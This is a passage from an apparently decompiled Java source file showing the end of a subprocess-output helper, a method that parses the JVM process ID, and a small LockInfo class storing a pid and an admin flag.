         p.waitFor();
         return new String(baos.toByteArray(), StandardCharsets.UTF_8);
      } catch (Exception ignored) {
         if (p != null) {
            p.destroyForcibly();
         }

         return null;
      }
   }

   private static long getProcessId() {
      String jvmName = ManagementFactory.getRuntimeMXBean().getName();
      if (jvmName != null) {
         int idx = jvmName.indexOf(64);
         if (idx > 0) {
            try {
               return Long.parseLong(jvmName.substring(0, idx));
            } catch (NumberFormatException var3) {
            }
         }
      }

      return -1L;
   }

   private static final class LockInfo {
      private final long pid;
      private final boolean admin;

      private LockInfo(long pid, boolean admin) {
         this.pid = pid;
         this.admin = admin;
      }
   }
}
